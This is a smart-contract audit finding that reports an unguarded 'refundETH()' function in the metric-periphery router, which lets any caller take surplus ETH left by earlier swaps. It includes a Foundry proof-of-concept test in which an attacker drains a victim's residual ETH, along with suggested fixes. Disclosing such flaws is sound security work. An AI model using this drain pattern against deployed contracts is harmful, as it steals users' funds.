### Title
Unguarded `refundETH()` Allows Any Caller to Steal Residual ETH Left by a Prior Swap — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

---

### Summary

`refundETH()` unconditionally transfers the router's entire native ETH balance to `msg.sender` with no access control. Because every swap entry-point (`exactInputSingle`, `exactOutputSingle`, `exactInput`, `exactOutput`) is `payable` and the `pay()` helper only wraps exactly the required `value` of ETH — leaving any excess in the contract — a user who sends more ETH than `amountIn` without bundling `refundETH` in the same `multicall` leaves residual ETH in the router. Any subsequent caller can drain it by calling `refundETH()` directly.

---

### Finding Description

**ETH enters the router via payable swap calls.**
The `receive()` fallback rejects plain ETH transfers from non-WETH addresses, but this guard does not apply to payable function calls. A user can legitimately call `exactInputSingle{value: 2 ether}` with `amountIn = 1000 wei` (WETH as `tokenIn`). [1](#0-0) 

**`pay()` wraps only the exact required amount, leaving the rest.**
Inside the swap callback, `pay()` checks `nativeBalance >= value` and wraps exactly `value` ETH, depositing it as WETH and forwarding it to the pool. The surplus (`nativeBalance - value`) remains as raw ETH in the contract after the transaction completes. [2](#0-1) 

**`refundETH()` has no access control.**
It reads `address(this).balance` and calls `_transferETH(msg.sender, balance)` — no check that `msg.sender` is the original depositor, no transient-storage ownership record, nothing. [3](#0-2) 

**The swap entry-points are all `payable` and perform no post-swap ETH refund.**
`exactInputSingle` completes after `_clearExpectedCallbackPool()` with no automatic refund of excess ETH. [4](#0-3) 

The intended safe pattern — `multicall{value}([swap, refundETH])` — is documented but not enforced. A user who calls a swap function directly with excess ETH, or who forgets to append `refundETH` to their multicall, leaves ETH permanently exposed. [5](#0-4) 

---

### Impact Explanation

Direct loss of user principal. Any ETH left in the router after a swap is immediately claimable by any EOA or contract that calls `refundETH()`. The attacker does not need to front-run; they can call it in any subsequent block. The victim loses the full surplus ETH they sent.

---

### Likelihood Explanation

Medium. The trigger requires a user to send excess ETH to a payable swap function without including `refundETH` in the same `multicall`. This is a realistic mistake: users may call `exactInputSingle` or `exactOutputSingle` directly with a round-number ETH value, or may construct a multicall that omits the refund step. The exploit itself is trivial — a single permissionless call.

---

### Recommendation

Two complementary mitigations:

1. **Track ETH ownership in transient storage.** When a payable swap function is entered, record `msg.sender` as the ETH depositor. In `refundETH()`, require `msg.sender == storedDepositor` (or refund only to the stored depositor regardless of caller).

2. **Auto-refund excess ETH at the end of each top-level swap.** After `_clearExpectedCallbackPool()`, compute `address(this).balance` and, if non-zero, transfer it back to `msg.sender` unconditionally — mirroring how Uniswap v3's `SwapRouter02` handles this.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import "forge-std/Test.sol";
import {MetricOmmSimpleRouter} from "metric-periphery/contracts/MetricOmmSimpleRouter.sol";
import {IMetricOmmSimpleRouter} from "metric-periphery/contracts/interfaces/IMetricOmmSimpleRouter.sol";

contract RefundETHTheftTest is Test {
    // Assume router, pool, weth, token1 are set up as in SimpleRouterTestBase
    // userA sends 2 ether but amountIn is only 1000 wei

    function test_attacker_steals_residual_eth() public {
        address userA   = makeAddr("userA");
        address attacker = makeAddr("attacker");
        vm.deal(userA, 2 ether);

        // UserA calls exactInputSingle directly (no multicall, no refundETH)
        vm.prank(userA);
        router.exactInputSingle{value: 2 ether}(
            IMetricOmmSimpleRouter.ExactInputSingleParams({
                pool:            address(pool),
                tokenIn:         address(weth),
                tokenOut:        address(token1),
                zeroForOne:      true,
                amountIn:        1000,          // only 1000 wei consumed
                amountOutMinimum: 0,
                recipient:       userA,
                deadline:        block.timestamp + 1,
                priceLimitX64:   0,
                extensionData:   ""
            })
        );

        // Router now holds ~2 ether - 1000 wei of residual ETH
        assertGt(address(router).balance, 0, "residual ETH in router");

        // Attacker drains it
        vm.prank(attacker);
        router.refundETH();

        assertEq(address(router).balance, 0,   "router drained");
        assertGt(attacker.balance,        0,   "attacker received userA's ETH");
        assertEq(userA.balance,           0,   "userA lost surplus ETH");
    }
}
```

### Citations

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L32-34)
```text
  receive() external payable {
    if (msg.sender != WETH) revert NotWETH();
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L58-63)
```text
  function refundETH() external payable override {
    uint256 balance = address(this).balance;
    if (balance > 0) {
      _transferETH(msg.sender, balance);
    }
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L74-78)
```text
      uint256 nativeBalance = address(this).balance;
      if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
      } else if (nativeBalance > 0) {
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L67-86)
```text
  function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut) {
    _checkDeadline(params.deadline);
    uint128 priceLimitX64 = MetricOmmSwapPath.normalizePriceLimit(params.zeroForOne, params.priceLimitX64);

    _setNextCallbackContext(params.pool, CALLBACK_MODE_JUST_PAY, msg.sender, params.tokenIn);
    (int128 amount0Delta, int128 amount1Delta) = IMetricOmmPoolActions(params.pool)
      .swap(
        params.recipient,
        params.zeroForOne,
        MetricOmmSwapInputs.asAmountSpecifiedIn(params.amountIn),
        priceLimitX64,
        "",
        params.extensionData
      );
    int128 out = MetricOmmSwapResults.extractAmountOut(params.zeroForOne, amount0Delta, amount1Delta);
    amountOut = MetricOmmSwapInputs.int128ToUint128(out);
    if (amountOut < params.amountOutMinimum) revert InsufficientOutput(amountOut, params.amountOutMinimum);

    _clearExpectedCallbackPool();
  }
```

**File:** metric-periphery/contracts/interfaces/IMetricOmmPoolLiquidityAdder.sol (L16-17)
```text
///      `multicall{value}`) when the pool's WETH leg is token0 or token1; unused ETH can be reclaimed via
///      `refundETH` in the same multicall.
```
